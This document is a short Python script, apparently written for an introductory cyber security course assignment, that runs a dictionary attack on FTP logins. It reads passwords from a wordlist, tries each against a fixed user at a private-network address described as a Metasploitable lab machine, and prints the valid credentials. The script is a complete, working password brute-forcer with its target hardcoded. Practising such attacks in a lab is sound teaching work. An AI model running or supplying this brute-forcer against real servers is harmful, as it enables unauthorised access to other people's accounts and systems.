#A library that can connects to FTP port 21
import ftplib

def ftpConnect(ip,user,pass_list):

    #Opens the word list that I made, with read privilages, and gave it a name passwords
    with open(pass_list, 'r') as passwords:

        #loops for the word list to try every password
        for password in passwords:
            password=password.strip()#there was a error (New line \n error so I used strip to remove spaces and newlines)

            try:
                #The try and except will generate an exception if there is an error which will happen if the it can not connect to the metasploitable

                ftp = ftplib.FTP(ip)
                ftp.login(user,password)
                #this two lines the first one establish the connection with the ip and the second line logs in the machine with the provided user and word list

                print(f'The password {password} is correct')
                print(f'The username {user} and the password {password} are vaild for the {ip}')
                return 

            except:
                print(f'The password {password} is wrong')


ftpConnect('192.168.1.12','Magdy2',"Desktop\\Collage\\Intro to Cyber Security\\Section\\Assignments\\Assignment 4\\mmm.txt")